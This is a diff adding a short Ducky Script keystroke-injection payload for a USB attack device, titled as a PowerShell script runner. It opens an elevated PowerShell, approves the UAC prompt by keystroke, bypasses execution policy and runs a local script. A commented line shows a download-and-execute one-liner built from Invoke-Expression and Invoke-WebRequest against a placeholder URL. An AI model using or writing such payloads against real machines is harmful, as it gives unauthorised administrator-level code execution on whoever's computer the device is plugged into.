@@ -1,0 +1,33 @@
+REM PowerShell Script Runner
+REM Executes a PowerShell script from a URL or local file
+REM WARNING: Only use with trusted sources!
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+DELAY 500
+ENTER
+DELAY 1000
+STRING Write-Host "PowerShell execution policy bypassed for this session"
+DELAY 500
+ENTER
+DELAY 1000
+REM Example: Run script from URL (modify URL)
+REM STRING Invoke-Expression (Invoke-WebRequest -Uri "https://example.com/script.ps1" -UseBasicParsing).Content
+REM DELAY 500
+REM ENTER
+REM Or run local script
+STRING .\script.ps1
+DELAY 500
+ENTER
+DELAY 2000
+STRING exit
+DELAY 500
+ENTER
